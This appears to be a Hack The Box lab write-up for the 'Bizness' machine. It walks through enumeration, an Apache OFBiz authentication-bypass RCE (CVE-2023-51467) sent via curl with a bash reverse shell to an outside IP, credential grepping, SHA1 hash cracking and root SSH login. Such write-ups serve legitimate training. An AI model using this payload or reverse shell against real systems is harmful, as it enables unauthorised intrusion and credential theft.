## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)
- Prep: [OSCP](OSCP.md)

## 🔍 Enumeration

```bash
nmap -p- -T4 10.10.11.X
```

> Port [80](HTTP.md) was open and used for further exploitation.

---

## 🗂️ Hosts File Update

```bash
sudo nano /etc/hosts
```

Add:

```text
10.10.11.X  bizness.htb
```

---

## 🕵️ Directory Enumeration

```bash
dirsearch -u http://bizness.htb
```

> Revealed `/control/login` and other routes.

---

## 🔐 Authentication Discovery

> Manual testing in browser showed:
- `"admin"` = valid username
- gibberish usernames = `"User does not exist"`

---

## 💥 Initial Foothold - Apache OfBiz RCE (CVE-2023-51467)

### Payload (Groovy Sandbox RCE):

```bash
curl -kv -H "Host: bizness.htb:443" \
-d "groovyProgram=x=new String[3];x[0]='bash';x[1]='-c';x[2]='bash -i >& /dev/tcp/10.10.16.98/1234 0>&1;';x.execute();" \
"https://bizness.htb:443/webtools/control/ProgramExport/?requirePasswordChange=Y&PASSWORD=lobster&USERNAME=albino"
```

> `bash reverse shell` sent via vulnerable Groovy context.  
> `curl` is used since `wget` is blocked.

---

## 📞 Set Up Listener

```bash
nc -lvnp 1234
```

---

## 🧑‍💻 Gained Shell as `ofbiz`

```bash
whoami
cat /etc/passwd
ls /home
cat user.txt
```

---

## ⬆️ Privilege Escalation

### 🔎 Grep for Passwords

```bash
grep -arin -o -E '(\w+\W+){0,5}Password(\w+\W+){0,5}' /
```

> Discovered:
- `Adminuserlogindata.xml`
- `c54d0.dat` (contains salted SHA1 hash)

---

## 🔓 Crack OfBiz SHA1 Password

### Clone Cracker Tool

```bash
git clone https://github.com/duck-sec/Apache-OFBiz-SHA1-Cracker
cd Apache-OFBiz-SHA1-Cracker
```

### Use RockYou Wordlist

```bash
python3 crack.py -w /usr/share/wordlists/rockyou.txt -H <hash>
```

> Recovered password: `monkeybizness`

---

## 🔐 [SSH](SSH) as Root

```bash
ssh root@bizness.htb
```

> Used cracked password from the OfBiz hash.

---

## 🏁 Get Root Flag

```bash
cat /root/root.txt
```